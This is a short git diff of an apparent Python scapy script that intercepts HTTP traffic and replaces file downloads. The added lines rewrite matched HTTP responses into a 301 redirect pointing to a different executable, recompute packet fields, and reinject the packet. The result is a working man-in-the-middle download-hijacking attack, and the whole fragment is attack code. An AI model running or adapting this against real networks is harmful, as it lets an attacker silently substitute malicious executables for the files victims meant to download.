@@ -16,11 +16,14 @@ def proccess_packet(packet):
                 print(scapy_packet.show())
 
         elif scapy_packet[scapy.TCP].sport == 80:
-            print("\n[+] HTTP Response")
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing File")
-                print(scapy_packet.show())
+                scapy_packet[scapy.Raw].load = " HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-59b3.exe\n\n"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
